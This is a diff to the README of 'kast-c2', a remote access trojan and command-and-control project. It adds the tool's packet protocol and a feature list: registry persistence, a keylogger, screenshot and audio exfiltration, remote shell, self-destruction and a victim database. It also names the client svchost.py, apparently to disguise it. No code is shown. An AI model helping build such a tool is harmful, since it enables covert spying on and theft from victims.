@@ -25,32 +25,45 @@ The project has two sides:
 
 **Server (`server.py`)** — runs on the attacker machine. Accepts incoming connections, stores victim data in SQLite, and dispatches commands.
 
+## Protocol
+
+All communication uses a structured binary protocol:
+
+```
+TYPE|LENGTH|EXTRA\n
+[LENGTH bytes of payload]
+```
+
+- `TYPE` — packet type (`TEXT`, `PNG`, `WAV`, `TMP`, `CWD`)
+- `LENGTH` — payload size in bytes
+- `EXTRA` — filename or path (for files), `none` for text
+
 ## Features
 
 ### Implemented
 - [x] TCP socket-based C2 connection
+- [x] Structured binary protocol (`TYPE|LENGTH|EXTRA\n`)
 - [x] System info collection (hostname, IP, OS, platform)
 - [x] Windows registry persistence
 - [x] Self-copy to `AppData` before registry entry
 - [x] Screenshot capture and exfiltration
 - [x] Keylogger (runs in parallel thread, dumps to hidden file)
-- [x] Shell command execution with directory state
-- [x] Audio recording
+- [x] Audio recording and exfiltration
+- [x] Shell command execution with directory state (`cd` updates prompt)
 - [x] Self-destruction
+- [x] C2 server with SQLite victim persistence
 
 ### In progress
-- [ ] Binary message protocol (type|size|extra header)
-- [ ] Audio exfiltration via socket
 - [ ] File download command
-- [ ] C2 server (`server.py`) with SQLite persistence
 - [ ] Reconnection logic
+- [ ] Multiple victim management
 
 ## Project Structure
 
 ```
 kast-c2/
 ├── svchost.py      # RAT client (victim side)
-├── server.py       # C2 server (attacker side) — WIP
+├── server.py       # C2 server (attacker side)
 ├── db.py           # SQLite helpers
 └── loot/           # Exfiltrated data (gitignored)
 ```
